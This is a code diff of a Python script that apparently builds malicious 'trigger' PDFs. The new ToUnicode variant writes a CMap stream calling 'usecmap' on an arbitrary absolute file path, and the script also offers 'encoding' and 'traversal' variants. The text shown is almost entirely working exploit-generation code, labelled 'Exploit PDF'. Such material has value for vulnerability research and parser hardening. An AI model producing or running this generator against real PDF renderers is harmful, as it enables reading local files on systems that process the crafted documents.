@@ -1,24 +1,30 @@
 import io, struct
 
-def build_trigger(args):
+def build_trigger(args, output_file=None):
     if args.encoding_path == None:
         print("Please provide '--encoding-path' parameter")
         exit()
-        
-    trigger_type = getattr(args, 'pdf_trigger_type', 'cmap')
-    
-    if trigger_type == 'cmap':
-        content = build_trigger_pdf_cmap(args.encoding_path)
-        output_file = args.output + "l1.pdf"
+
+    if output_file is None:
+        output_file = "l1.pdf"
+
+    trigger_type = getattr(args, 'pdf_trigger_type', 'tounicode')
+
+    if trigger_type == 'tounicode':
+        content = build_trigger_pdf_tounicode(args.encoding_path)
+    elif trigger_type == 'encoding':
+        content = build_trigger_pdf_encoding(args.encoding_path)
     elif trigger_type == 'traversal':
         content = build_trigger_pdf_traversal(args.encoding_path)
-        output_file = args.output + "l1.pdf"
     else:
-        print(f"Unknown trigger type: {trigger_type}")
+        print(f"[!] Unknown trigger type: {trigger_type}")
+        print(f"[*] Available types: tounicode, encoding, traversal")
         exit()
-    
+
     with open(output_file, "wb") as file:
         file.write(content)
+
+    return output_file
 
 def encode_pdf_name_abs(abs_path: str) -> str:
     return "/" + abs_path.replace("/", "#2F")
@@ -26,7 +32,56 @@ def encode_pdf_name_abs(abs_path: str) -> str:
 def obj(n, body: bytes):
     return f"{n} 0 obj\n".encode() + body + b"\nendobj\n"
 
-def build_trigger_pdf_cmap(path: str) -> bytes:
+def build_trigger_pdf_tounicode(path: str) -> bytes:
+    enc_path = encode_pdf_name_abs(path)
+
+    tounicode_stream = f"/CIDInit /ProcSet findresource begin\n{enc_path} usecmap\nend\n".encode()
+
+    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
+    objs = []
+
+    objs.append(obj(1, b"<< /Type /Catalog /Pages 2 0 R >>"))
+
+    objs.append(obj(2, b"<< /Type /Pages /Count 1 /Kids [3 0 R] >>"))
+
+    page = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] " \
+           b"/Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>"
+    objs.append(obj(3, page))
+
+    font_dict = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /ToUnicode 6 0 R >>"
+    objs.append(obj(4, font_dict))
+
+    content = b"BT /F1 12 Tf 50 700 Td (Exploit PDF) Tj ET"
+    stream_obj = b"<< /Length %d >>\nstream\n" % len(content) + content + b"\nendstream"
+    objs.append(obj(5, stream_obj))
+
+    tounicode_obj = b"<< /Length %d >>\nstream\n" % len(tounicode_stream) + \
+                    tounicode_stream + b"\nendstream"
+    objs.append(obj(6, tounicode_obj))
+
+    buf = io.BytesIO()
+    buf.write(header)
+    offsets = []
+    cursor = len(header)
+
+    for o in objs:
+        offsets.append(cursor)
+        buf.write(o)
+        cursor += len(o)
+
+    xref_start = buf.tell()
+    buf.write(b"xref\n0 7\n")
+    buf.write(b"0000000000 65535 f \n")
+    for off in offsets:
+        buf.write(f"{off:010d} 00000 n \n".encode())
+
+    buf.write(b"trailer\n<< /Size 7 /Root 1 0 R >>\n")
+    buf.write(f"startxref\n{xref_start}\n%%EOF\n".encode())
+
+    return buf.getvalue()
+
+
+def build_trigger_pdf_encoding(path: str) -> bytes:
     enc_name = encode_pdf_name_abs(path)
     header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
     objs = []
